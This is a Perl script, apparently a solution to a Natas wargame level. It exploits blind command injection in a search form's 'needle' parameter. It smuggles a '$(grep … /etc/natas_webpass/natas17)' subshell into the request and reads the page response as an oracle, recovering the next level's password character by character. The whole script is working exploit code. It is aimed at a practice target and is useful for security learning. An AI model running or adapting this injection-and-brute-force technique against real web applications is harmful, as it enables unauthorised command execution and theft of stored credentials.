sub req {
    my ($needle) = @_;
    my $new_url = $url . "?needle=$needle&submit=Search";
    my $response = $http->get($new_url, { headers => \%headers });

    unless ($response->{success}) {
        die "Failed: $response->{status} $response->{content}\n";
    }

    return $response->{content};
}

sub correct {
    my ($candidate) = @_;

    return $candidate =~ "counterexample" ? 0 : 1;
}

sub check {
    my ($candidate) = @_;

    print "Attempting password: $candidate\n";
    my $encoded = uri_escape("counterexample\$(grep $candidate /etc/natas_webpass/natas17)");

    return req $encoded;
}

while (length $natas17_pass < 32) {
    for my $ch (split //, $chars) {
        my $res1 = check "$natas17_pass$ch";

        if (correct $res1) {
            $natas17_pass = "$natas17_pass$ch";
            print "$natas17_pass\n";
            last;
        }

        my $res2 = check "$ch$natas17_pass";

        if (correct $res2) {
            $natas17_pass = "$ch$natas17_pass";
            print "$natas17_pass\n";
            last;
        }
    }
}